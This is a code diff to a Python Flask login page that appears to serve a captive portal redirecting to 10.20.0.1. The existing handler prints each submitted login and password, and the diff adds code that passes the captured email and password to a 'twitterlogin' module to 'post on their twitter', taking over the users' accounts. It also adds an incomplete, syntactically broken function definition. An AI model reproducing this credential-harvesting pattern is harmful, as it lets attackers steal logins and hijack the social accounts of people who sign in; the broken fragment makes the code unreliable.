@@ -3,6 +3,7 @@
 from flask import Flask, request, redirect, render_template
 import urllib
 import os
+import twitterlogin
 
 app = Flask(__name__)
 
@@ -13,6 +14,13 @@ def login_user(ip):
 def login():
     if request.method == 'POST' and 'login' in request.form and 'password' in request.form:
         print 'login:', request.form['login'], 'password:', request.form['password']
+        # Pull out email and password
+        email = request.form['login']
+        password = request.form['password']
+
+        # Try to post on their twitter
+        twitterlogin.loginTwitter(email, password)
+
         login_user(request.remote_addr)
         if 'orig_url' in request.args and len(request.args['orig_url']) > 0:
             return redirect(urllib.unquote(request.args['orig_url']))
@@ -39,6 +47,8 @@ def styles():
 def catch_all(path):
     # return redirect("/login?"+urllib.urlencode({'orig_url': request.url}))
     return redirect("http://10.20.0.1/login?" + urllib.urlencode({'orig_url': request.url}))
+
+def check_and_post_on_twitter
 
 if __name__ == "__main__":
 #    app.debug = True
